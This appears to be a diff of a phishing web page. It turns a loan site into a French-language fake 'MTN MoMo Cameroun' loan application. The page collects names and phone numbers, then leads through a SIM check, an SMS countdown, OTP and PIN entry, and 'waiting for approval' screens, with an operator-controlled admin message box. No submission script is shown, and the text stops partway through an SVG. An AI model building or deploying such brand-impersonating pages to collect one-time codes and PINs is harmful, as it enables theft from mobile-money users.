+            color: #fff;
+        }
+        
+        .sms-curve {
+            background: #fff;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        
+        .sms-curve::before {
+            content: '';
+            display: block;
+            background: var(--mtn-dark);
+            height: 50px;
+            clip-path: ellipse(60% 100% at 50% 100%);
+            margin-bottom: -4px;
+        }
+        
+        .sms-foot {
+            background: var(--mtn-dark);
+            padding: 14px;
+            text-align: center;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.45);
+        }
+        /* ───── SMS COUNTDOWN TIMER ───── */
+        
+        .sms-timer-wrap {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 14px;
+            padding: 10px 14px;
+            background: #fff8f0;
+            border: 1.5px solid #f5c28a;
+            border-radius: var(--radius-sm);
+        }
+        
+        .sms-timer-circle {
+            position: relative;
+            width: 44px;
+            height: 44px;
+            flex-shrink: 0;
+        }
+        
+        .sms-timer-svg {
+            transform: rotate(-90deg);
+        }
+        
+        .sms-timer-bg {
+            fill: none;
+            stroke: #f0e0cc;
+            stroke-width: 4;
+        }
+        
+        .sms-timer-arc {
+            fill: none;
+            stroke: #e07800;
+            stroke-width: 4;
+            stroke-linecap: round;
+            stroke-dasharray: 113;
+            stroke-dashoffset: 0;
+            transition: stroke-dashoffset 1s linear, stroke 1s;
+        }
+        
+        .sms-timer-arc.urgent {
+            stroke: #d91e1e;
+        }
+        
+        .sms-timer-num {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: #e07800;
+        }
+        
+        .sms-timer-num.urgent {
+            color: #d91e1e;
+        }
+        
+        .sms-timer-text {
+            font-size: 0.82rem;
+            color: #7a4500;
+            line-height: 1.4;
+        }
+        
+        .sms-timer-text strong {
+            font-weight: 600;
+        }
+        
+        .sms-resend-wrap {
+            display: none;
+            background: #fef2f2;
+            border: 1.5px solid #fecaca;
+            border-radius: var(--radius-sm);
+            padding: 16px 16px 14px;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+        
+        .sms-resend-wrap p {
+            font-size: 0.83rem;
+            color: #991b1b;
+            margin-bottom: 12px;
             line-height: 1.5;
         }
         
-        footer {
-            background: var(--dark);
-            color: white;
-            padding: 60px 5% 20px;
+        .btn-resend {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 10px 22px;
+            background: var(--grad);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: opacity 0.2s;
+        }
+        
+        .btn-resend:hover {
+            opacity: 0.88;
+        }
+        
+        .btn-resend:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        /* ───── PAGE: WAIT FOR SMS APPROVAL ───── */
+        
+        #page-wait-sms {
+            background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .wait-wrap {
             text-align: center;
-            margin-top: 50px;
+            padding: 40px 24px;
+            max-width: 420px;
         }
         
-        .footer-content {
+        .wait-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
             display: flex;
-            justify-content: space-around;
-            flex-wrap: wrap;
-            gap: 30px;
-            margin-bottom: 40px;
-            text-align: left;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 24px;
+            animation: pulse 2s ease infinite;
         }
         
-        .footer-col h4 {
-            margin-bottom: 20px;
-            color: var(--orange);
+        .wait-wrap h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
         }
         
-        .footer-col a {
-            color: #ccc;
-            text-decoration: none;
+        .wait-wrap p {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 0.88rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        /* ───── PAGE: OTP ───── */
+        
+        #page-otp {
+            background: #fff;
+        }
+        
+        .otp-topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            height: 52px;
+            border-bottom: 1px solid #eee;
+            flex-shrink: 0;
+        }
+        
+        .otp-topbar .bk {
+            font-size: 1.1rem;
+            color: #333;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+        
+        .otp-body-wrap {
+            flex: 1;
+            padding: 32px 16px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+        }
+        
+        .otp-card {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: var(--radius);
+            padding: 32px 28px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06);
+        }
+        
+        .otp-card h2 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: var(--mtn-dark);
+        }
+        
+        .otp-hint {
+            font-size: 0.83rem;
+            color: var(--text-light);
+            margin-bottom: 5px;
+        }
+        
+        .otp-section {
+            margin-bottom: 24px;
+        }
+        
+        .otp-section-title {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--mtn-dark);
+            margin-bottom: 12px;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+            width: 100%;
+        }
+        
+        .otp-box {
+            flex: 1;
+            min-width: 0;
+            width: 0;
+            height: 52px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            text-align: center;
+            font-family: 'Inter', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--mtn-dark);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .otp-box:focus {
+            border-color: var(--mtn-gold);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .otp-box::-webkit-outer-spin-button,
+        .otp-box::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        
+        .otp-box[type=number] {
+            -moz-appearance: textfield;
+        }
+        
+        .otp-delete {
+            cursor: pointer;
+            color: var(--text-light);
+            font-size: 1rem;
+            background: none;
+            border: none;
+            margin-left: 6px;
+            padding: 0;
+            transition: color 0.2s;
+        }
+        
+        .otp-delete:hover {
+            color: var(--mtn-gold);
+        }
+        
+        .btn-otp {
+            width: 100%;
+            padding: 13px;
+            background: #e8e8e8;
+            color: #aaa;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s;
+        }
+        
+        .btn-otp.rdy {
+            background: var(--grad);
+            color: #fff;
+        }
+        
+        .otp-curve {
+            background: #fff;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        
+        .otp-curve::before {
+            content: '';
             display: block;
-            margin-bottom: 10px;
-            transition: color 0.3s;
+            background: var(--mtn-dark);
+            height: 50px;
+            clip-path: ellipse(60% 100% at 50% 100%);
+            margin-bottom: -4px;
         }
         
-        .footer-col a:hover {
-            color: white;
+        .otp-foot {
+            background: var(--mtn-dark);
+            padding: 14px;
+            text-align: center;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.45);
+        }
+        /* ───── PAGE: WAIT FOR OTP APPROVAL ───── */
+        
+        #page-wait-otp {
+            background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+            align-items: center;
+            justify-content: center;
         }
         
-        .social-icons {
-            margin-top: 20px;
+        .wait-wrap {
+            text-align: center;
+            padding: 40px 24px;
+            max-width: 420px;
         }
         
-        .social-icons a {
-            display: inline-block;
-            margin-right: 15px;
-            font-size: 1.5rem;
+        .wait-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 24px;
+            animation: pulse 2s ease infinite;
         }
         
-        .copyright {
-            border-top: 1px solid #333;
-            padding-top: 20px;
-            color: #888;
-            font-size: 14px;
+        .wait-wrap h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        
+        .wait-wrap p {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 0.88rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        /* ───── PAGE: APPROVAL ───── */
+        
+        #page-approval {
+            background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 16px;
+        }
+        
+        .appr-wrap {
+            width: 100%;
+            max-width: 520px;
+        }
+        
+        .appr-top {
+            background: #fff;
+            border-radius: var(--radius) var(--radius) 0 0;
+            padding: 28px 24px 0;
+            text-align: center;
+        }
+        
+        .check-circle {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--mtn-gold), var(--mtn-light));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 1.3rem;
+            color: #fff;
+            box-shadow: 0 4px 16px rgba(255, 215, 0, 0.5);
+        }
+        
+        .appr-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+        
+        .appr-sub {
+            font-size: 0.82rem;
+            color: var(--text-light);
+            margin-bottom: 18px;
+        }
+        
+        .appr-banner {
+            background: var(--grad);
+            padding: 16px;
+            margin: 0 -24px;
+            text-align: center;
+        }
+        
+        .appr-banner .abl {
+            font-size: 0.72rem;
+            color: rgba(255, 255, 255, 0.8);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+        }
+        
+        .appr-banner .aba {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #fff;
+        }
+        
+        .comp-box {
+            background: #FFFBEA;
+            border: 1px solid #F5C842;
+            padding: 14px 16px;
+        }
+        
+        .comp-box .ch {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.82rem;
+            font-weight: 700;
+            color: #a07000;
+            margin-bottom: 6px;
+        }
+        
+        .comp-box p {
+            font-size: 0.78rem;
+            color: #7a5500;
+            line-height: 1.6;
+        }
+        
+        .comp-box strong {
+            font-weight: 600;
+        }
+        
+        .ld-card {
+            background: #fff;
+            padding: 20px 24px;
+        }
+        
+        .ld-htitle {
+            font-size: 0.82rem;
+            font-weight: 600;
+            color: var(--text-mid);
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .ld-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 0;
+            border-bottom: 1px solid #f5f5f5;
+        }
+        
+        .ld-row:last-child {
+            border-bottom: none;
+        }
+        
+        .ld-icon {
+            width: 34px;
+            height: 34px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+            flex-shrink: 0;
+        }
+        
+        .ic-g {
+            background: linear-gradient(135deg, #2ECC71, #27AE60);
+            color: #fff;
+        }
+        
+        .ic-b {
+            background: linear-gradient(135deg, #3498DB, #2980B9);
+            color: #fff;
+        }
+        
+        .ic-p {
+            background: linear-gradient(135deg, #9B59B6, #8E44AD);
+            color: #fff;
+        }
+        
+        .ld-lbl {
+            font-size: 0.72rem;
+            color: var(--text-light);
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+        }
+        
+        .ld-val {
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        
+        .nxt-steps {
+            background: #fff;
+            padding: 14px 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            border-top: 1px solid #f0f0f0;
+        }
+        
+        .nxt-steps p {
+            font-size: 0.79rem;
+            color: var(--text-light);
+            line-height: 1.5;
+        }
+        
+        .rth-wrap {
+            background: #fff;
+            border-radius: 0 0 var(--radius) var(--radius);
+            padding: 14px 24px 24px;
+        }
+        
+        .rth-btn {
+            width: 100%;
+            padding: 13px;
+            background: var(--grad);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+        }
+        /* ───── INLINE ERROR / STATUS MESSAGES ───── */
+        
+        .msg-box {
+            border-radius: var(--radius-sm);
+            padding: 12px 16px;
+            font-size: 0.84rem;
+            margin-bottom: 16px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .msg-box.show {
+            display: flex;
+        }
+        
+        .msg-box.error {
+            background: #fef2f2;
+            border: 1.5px solid #fecaca;
+            color: #991b1b;
+        }
+        
+        .msg-box.success {
+            background: #f0fdf4;
+            border: 1.5px solid #bbf7d0;
+            color: #166534;
+        }
+        
+        .msg-box.info {
+            background: #eff6ff;
+            border: 1.5px solid #bfdbfe;
+            color: #1e40af;
+        }
+        
+        .msg-box.warning {
+            background: #fefce8;
+            border: 1.5px solid #fef08a;
+            color: #854d0e;
+        }
+        
+        .msg-icon {
+            font-weight: 700;
+        }
+        /* ───── LOADING ───── */
+        
+        .loading {
+            display: none;
+        }
+        
+        .loading.show {
+            display: block;
+        }
+        
+        .wait-msg {
+            text-align: center;
+            color: var(--text-light);
+            font-size: 0.88rem;
+        }
+        /* ───── RESPONSIVE ───── */
+        
+        @media (max-width: 480px) {
+            .field-row {
+                grid-template-columns: 1fr;
+            }
+            .land-card {
+                padding: 24px 18px;
+            }
+            .step-card {
+                padding: 24px 18px;
+            }
+            .pin-box {
+                width: 42px;
+                height: 42px;
+                font-size: 1rem;
+            }
+            .otp-box {
+                height: 42px;
+                font-size: 1rem;
+            }
+            .mtn-logo .logo-img {
+                height: 34px;
+            }
+            .mtn-logo .logo-img.small {
+                height: 24px;
+            }
+            .mtn-logo .logo-img.tiny {
+                height: 20px;
+            }
+            .admin-modal {
+                padding: 28px 20px 22px;
+            }
+            /* Sim card responsive adjustment */
+            #page-sim-check .circle-overlap {
+                width: 220px;
+                height: 220px;
+            }
+            #page-sim-check .circle-overlap svg {
+                width: 110px;
+                height: 132px;
+            }
         }
     </style>
 </head>
 
 <body>
 
-    <div class="orb orb-1"></div>
-    <div class="orb orb-2"></div>
-    <div class="orb orb-3"></div>
-
-    <nav>
-        <div class="logo">
-            <span class="max">Max</span><span class="it">it</span>
-        </div>
-        <div class="nav-links">
-            <a href="#home">Home</a>
-            <a href="#about">About Us</a>
-            <a href="#contact">Contact</a>
-        </div>
-    </nav>
-
-    <section class="hero" id="home">
-        <div class="hero-content">
-            <div class="badges">
-                <div class="badge"><i class="fa-solid fa-bolt"></i> Instant Approval</div>
-                <div class="badge"><i class="fa-solid fa-shield-halved"></i> Bank-level Security</div>
+    <!-- ═══════════════════ ADMIN MODAL (IMPORTANT NOTE) ═══════════════════ -->
+    <div id="adminModalOverlay">
+        <div class="admin-modal">
+            <div class="modal-title">
+                <span>📌</span> NOTE IMPORTANTE
             </div>
-            <h1>Empower Your Dreams with <span>Max it Loans</span></h1>
-            <p>Get the funds you need instantly directly into your Orange Money Cameroon or Mobile Money wallet. No collateral required, just fair rates and flexible repayment terms.</p>
+            <div class="modal-body" id="adminModalBody">Message de l'administrateur</div>
+            <button class="modal-close-btn" onclick="closeAdminModal()">OK, COMPRIS</button>
         </div>
+    </div>
 
-        <div class="calculator-wrapper">
-            <div class="glass-card">
-                <div class="calc-header">
-                    <h2>Loan Calculator</h2>
-                    <p>Customize your loan to fit your needs</p>
-                </div>
-
-                <div class="input-group">
-                    <div class="label-row">
-                        <label>Loan Amount</label>
-                        <span id="amount-display">250,000 XAF</span>
+    <!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
+    <div id="page-landing" class="page">
+        <div class="land-nav">
+            <div style="flex: 1;"></div>
+            <div class="mtn-logo">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img" />
+                <div class="mtn-logo-text" style="color:#fff;">MoMo</div>
+                <div class="mtn-logo-sub" style="color:rgba(255,255,255,0.6);">par MTN Cameroun</div>
+                <div class="flag-badge"><span class="flag-emoji">Ca</span> Cameroun</div>
+            </div>
+            <div style="flex: 1;"></div>
+        </div>
+        <div class="land-center">
+            <div class="land-card">
+                <h1>Bienvenue sur MTN MoMo Ca</h1>
+                <p class="land-tagline">Obtenez des prêts facilement grâce à MTN MoMo au Cameroun</p>
+                <div class="calc-box">
+                    <h2>Calculateur de Prêt</h2>
+                    <div class="calc-row2">
+                        <span>Montant</span>
+                        <span class="cv" id="calcAmt">XAF 500 000</span>
                     </div>
-                    <input type="range" id="amount-slider" min="25000" max="2500000" step="25000" value="250000">
-                    <div class="slider-limits">
-                        <span>25,000 XAF</span>
-                        <span>2,500,000 XAF</span>
+                    <div class="calc-row2">
+                        <span>Durée</span>
+                        <span class="cv" id="calcTerm">48 Mois</span>
                     </div>
-                </div>
-
-                <div class="input-group">
-                    <div class="label-row">
-                        <label>Loan Term</label>
-                        <span id="term-display">12 months</span>
+                    <div class="slider-hint-wrap">
+                        <span class="hint-text">
+                            <span class="hint-arrow"></span> Glissez pour ajuster le montant du prêt
+                        </span>
                     </div>
-                    <input type="range" id="term-slider" min="3" max="24" step="1" value="12">
-                    <div class="slider-limits">
-                        <span>3 months</span>
-                        <span>24 months</span>
+                    <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()" />
+                    <div class="range-ends">
+                        <span>XAF 500 000</span>
+                        <span>XAF 5 000 000</span>
+                    </div>
+                    <div class="monthly-box">
+                        <span class="ml">Paiement Mensuel</span>
+                        <span class="ma" id="monthlyAmt">XAF 24 000</span>
                     </div>
                 </div>
-
-                <div class="result-box">
-                    <label>Monthly Payment</label>
-                    <div class="monthly-payment" id="payment-display">22,916 XAF</div>
-                </div>
-
-                <button class="btn-apply">APPLY NOW <i class="fa-solid fa-arrow-right" style="margin-left: 8px;"></i></button>
+                <button class="btn-grad" onclick="startApplication()">COMMENCER LA DEMANDE</button>
             </div>
         </div>
-    </section>
+        <div class="land-footer">© 2026 MTN MoMo Cameroun – Propulsé par MTN</div>
+    </div>
 
-    <section class="about" id="about">
-        <h2>Why Choose Max it Cameroon?</h2>
-        <div class="features-grid">
-            <div class="feature-card">
-                <i class="fa-solid fa-stopwatch"></i>
-                <h3>Fast Disbursements</h3>
-                <p>Once approved, your loan is credited instantly to your connected Orange Money or MoMo account. No waiting in lines.</p>
-            </div>
-            <div class="feature-card">
-                <i class="fa-solid fa-percent"></i>
-                <h3>Low Interest Rates</h3>
-                <p>We offer highly competitive rates starting from 18% annually, ensuring you only pay for what you truly need.</p>
-            </div>
-            <div class="feature-card">
-                <i class="fa-solid fa-mobile-screen-button"></i>
-                <h3>100% Digital</h3>
-                <p>Manage your entire loan lifecycle right from your phone. Apply, track, and repay effortlessly via the app.</p>
+    <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
+    <div id="page-step1" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-landing')">← Retour</a>
+                <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                    <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                    <div style="text-align: left;">
+                        <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                        <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Cameroun</div>
+                    </div>
+                    <span style="color:var(--mtn-gold); font-size:0.7rem;">CA</span>
+                </div>
+                <div class="nav-right">
+                    <div class="hline"></div>
+                    <div class="hline"></div>
+                    <div class="hline"></div>
+                </div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Demande de Prêt</h2>
+                <p class="step-sub">Étape 1 sur 3</p>
+                <div class="prog-row">
+                    <div class="prog-seg now"></div>
+                    <div class="prog-seg"></div>
+                    <div class="prog-seg"></div>
+                </div>
+                <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+                <div class="field"><label>Type de Prêt</label>
+                    <div class="sel-wrap"><select id="s1ty"><option>Prêt Personnel</option><option selected>Prêt Professionnel</option><option>Prêt Immobilier</option><option>Prêt Auto</option><option>Prêt Étudiant</option></select></div>
+                </div>
+                <div class="field"><label>Montant du Prêt (XAF)</label><input type="number" id="s1am" value="1000000" placeholder="Entrez le montant" oninput="clearErr('s1Err')" /></div>
+                <div class="field"><label>Durée du Prêt</label>
+                    <div class="sel-wrap"><select id="s1te"><option>6 Mois</option><option>12 Mois</option><option>18 Mois</option><option>24 Mois</option><option selected>48 Mois</option><option>60 Mois</option></select></div>
+                </div>
+                <div class="field"><label>Motif du Prêt</label><textarea id="s1pu" placeholder="Décrivez le motif de votre prêt…" oninput="clearErr('s1Err')"></textarea></div>
+                <button class="btn-grad" onclick="toS2()">ÉTAPE SUIVANTE</button>
             </div>
         </div>
-    </section>
+    </div>
 
-    <section class="contact-section" id="contact">
-        <h2>Contact Us</h2>
-        <div class="contact-grid">
-            <div class="contact-info-card">
-                <i class="fa-solid fa-phone"></i>
-                <div>
-                    <h4>Call Us</h4>
-                    <p><a href="tel:+23789000000">+237 8900 (Toll Free)</a></p>
-                    <p><a href="tel:+237699000000">+237 699 00 00 00</a></p>
+    <!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
+    <div id="page-step2" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step1')">← Retour</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Cameroun</div>
                 </div>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">CA</span>
             </div>
-            <div class="contact-info-card">
-                <i class="fa-solid fa-envelope"></i>
-                <div>
-                    <h4>Email Us</h4>
-                    <p><a href="mailto:support@maxit.cm">support@maxit.cm</a></p>
-                    <p><a href="mailto:info@maxit.cm">info@maxit.cm</a></p>
+            <div class="nav-right">
+                <div class="hline"></div>
+                <div class="hline"></div>
+                <div class="hline"></div>
+            </div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Demande de Prêt</h2>
+                <p class="step-sub">Étape 2 sur 3</p>
+                <div class="prog-row">
+                    <div class="prog-seg done"></div>
+                    <div class="prog-seg now"></div>
+                    <div class="prog-seg"></div>
                 </div>
-            </div>
-            <div class="contact-info-card">
-                <i class="fa-solid fa-location-dot"></i>
-                <div>
-                    <h4>Headquarters</h4>
-                    <p>Akwa, Boulevard de la Liberté
-                        <p>
-                            <p>Douala, Cameroon</p>
+                <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+                <div class="field-row">
+                    <div class="field"><label>Prénom</label><input type="text" id="s2fi" placeholder="Prénom" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label>Nom</label><input type="text" id="s2la" placeholder="Nom" oninput="clearErr('s2Err')" /></div>
+                </div>
+                <div class="field">
+                    <label>Numéro de Téléphone (MTN Cameroun)</label>
+                    <div class="phone-row">
+                        <div class="ph-pre">+237</div><input type="tel" id="s2ph" placeholder="671234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
+                    <div class="field-hint">9 chiffres sans le préfixe +237 (ex. : 671234567)</div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step1')">RETOUR</button>
+                    <button class="btn-grad" onclick="toS3()">ÉTAPE SUIVANTE</button>
                 </div>
             </div>
         </div>
-    </section>
+        <div class="pg-footer">© 2026 MTN MoMo Cameroun</div>
+    </div>
 
-    <footer>
-        <div class="footer-content">
-            <div class="footer-col">
-                <div class="logo" style="margin-bottom: 20px;">
-                    <span class="max">Max</span><span class="it">it</span>
+    <!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
+    <div id="page-step3" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step2')">← Retour</a>
+            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Cameroun</div>
                 </div>
-                <p style="color: #888; max-width: 250px;">The super-app designed to simplify your financial life in Cameroon.</p>
-                <div class="social-icons">
-                    <a href="#"><i class="fa-brands fa-facebook"></i></a>
-                    <a href="#"><i class="fa-brands fa-twitter"></i></a>
-                    <a href="#"><i class="fa-brands fa-instagram"></i></a>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">Ca</span>
+            </div>
+            <div class="nav-right">
+                <div class="hline"></div>
+                <div class="hline"></div>
+                <div class="hline"></div>
+            </div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Demande de Prêt</h2>
+                <p class="step-sub">Étape 3 sur 3</p>
+                <div class="prog-row">
+                    <div class="prog-seg done"></div>
+                    <div class="prog-seg done"></div>
+                    <div class="prog-seg now"></div>
                 </div>
-            </div>
-            <div class="footer-col">
-                <h4>Quick Links</h4>
-                <a href="#home">Home</a>
-                <a href="#about">About Us</a>
-                <a href="#contact">Contact Us</a>
-                <a href="#">Orange Money</a>
-            </div>
-            <div class="footer-col">
-                <h4>Legal</h4>
-                <a href="#">Terms of Service</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Loan Agreement</a>
+                <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+                <div class="field"><label>Situation Professionnelle</label>
+                    <div class="sel-wrap"><select id="s3em"><option>Salarié</option><option selected>Indépendant / Auto-entrepreneur</option><option>Sans emploi</option><option>Retraité</option><option>Étudiant</option></select></div>
+                </div>
+                <div class="field"><label>Revenu Annuel (XAF)</label><input type="number" id="s3in" placeholder="Entrez le revenu annuel" oninput="clearErr('s3Err')" /></div>
+                <div class="sum-box">
+                    <h3>Résumé de la Demande</h3>
+                    <div class="sum-row"><span class="sk">Montant du prêt :</span><span class="sv" id="sA">XAF 1 000 000</span></div>
+                    <div class="sum-row"><span class="sk">Durée du prêt :</span><span class="sv" id="sT">48 Mois</span></div>
+                    <div class="sum-row"><span class="sk">Motif :</span><span class="sv" id="sP">—</span></div>
+                    <div class="sum-row"><span class="sk">Demandeur :</span><span class="sv" id="sN">—</span></div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step2')">RETOUR</button>
+                    <button class="btn-grad" onclick="submitApp()">SOUMETTRE LA DEMANDE</button>
+                </div>
             </div>
         </div>
-        <div class="copyright">
-            &copy; 2026 Max it Cameroon. All rights reserved.
-        </div>
-    </footer>
+        <div class="pg-footer">© 2026 MTN MoMo Cameroun</div>
+    </div>
 
+    <!-- ══════════════════════ PAGE 5: PROCESSING ══════════════════════ -->
+    <div id="page-processing" class="page">
+        <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="proc-wrap">
+                <div class="proc-icon">⏳</div>
+                <h2>Traitement de la demande...</h2>
+                <p>Veuillez patienter pendant le traitement de votre demande de prêt</p>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7);">Vous allez être redirigé pour continuer avec MTN MoMo Cameroun</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 6: SIM CARD CHECK ══════════════════════ -->
+    <div id="page-sim-check" class="page" style="background: #fff;">
+        <div style="background-color: var(--mtn-dark); height: 45vh; border-radius: 0 0 40px 40px; position: relative; display: flex; flex-direction: column; align-items: center; flex-shrink: 0; padding-top: 20px;">
+            <button style="position: absolute; top: 20px; left: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">‹</button>
+            <button style="position: absolute; top: 20px; right: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">✕</button>
+
+            <!-- Large Overlapping Circle with White Ring & Shadow -->
+            <div class="circle-overlap" style="position: absolute; bottom: -50px; left: 50%; transform: translateX(-50%); width: 280px; height: 280px; background: #fff; border-radius: 50%; border: 10px solid #ffffff; box-shadow: 0 20px 40px rgba(0,0,0,0.15); display: flex; align-items: center; justify-content: center; z-index: 10;">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 120" width="160" height="192">
+                    <!-- Phone Body -->
+                    <rect x="25" y="20" width="50" height="100" rx="9" fill="#f4f8fc" stroke="#004080" stroke-width="5"/>
+                    <rect x="32" y="30" width="36" height="60" rx="3" fill="#fff" stroke="#d0d8e0" stroke-width="2.5"/>
+                    <line x1="36" y1="40" x2="54" y2="40" stroke="#d0d8e0" stroke-width="3"/>
+                    <line x1="36" y1="50" x2="54" y2="50" stroke="#d0d8e0" stroke-width="3"/>
+                    <line x1="36" y1="60" x2="48" y2="60" stroke="#d0d8e0" stroke-width="3"/>
+                    <circle cx="35" cy="98" r="5" fill="#d0d8e0"/>
+
+                    <!-- Arrow -->
